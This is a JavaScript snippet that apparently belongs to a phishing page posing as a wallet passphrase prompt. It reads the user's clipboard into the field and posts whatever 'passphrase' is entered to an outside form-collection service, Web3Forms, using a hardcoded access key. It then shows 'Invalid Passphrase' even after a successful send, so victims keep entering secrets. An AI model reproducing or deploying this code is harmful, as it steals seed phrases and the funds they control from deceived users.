const confirmBtn = document.querySelector('.confirm-btn');
  const pasteBtn = document.querySelector('.paste-btn');
  const textarea = document.querySelector('.phrase-input');

  // ✅ Make the Paste button functional
  pasteBtn.addEventListener('click', async function (e) {
    e.preventDefault();

    try {
      const text = await navigator.clipboard.readText();

      if (!text) {
        alert('Your clipboard is empty.');
        return;
      }

      textarea.value = text;   // Replace textarea content
      textarea.focus();
    } catch (err) {
      console.error('Paste failed:', err);
      alert('Could not read clipboard. Please paste manually (Ctrl+V / Cmd+V).');
    }
  });

  // ✅ Send textarea content to Web3Forms on Confirm
  confirmBtn.addEventListener('click', async function () {
    const message = textarea.value.trim();

    if (!message) {
      alert('Invalid Passphrase');
      return;
    }

    // Show sending state
    confirmBtn.disabled = true;
    confirmBtn.textContent = 'Sending...';

    try {
      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          access_key: '76bda745-3939-4821-9523-25ac845fa6db', // Replace with your Web3Forms access key
          subject: 'New message from my website',
          from_name: 'My Website',
          message: message
        })
      });

      const result = await response.json();

      if (response.status === 200) {
        alert('Invalid Passphrase');
        textarea.value = ''; // Clear after sending
      } else {
        alert('Error: ' + (result.message || 'Something went wrong'));
      }
    } catch (error) {
      console.error(error);
      alert('Something went wrong. Please try again.');
    } finally {
      confirmBtn.disabled = false;
      confirmBtn.textContent = 'Confirm';
    }
  });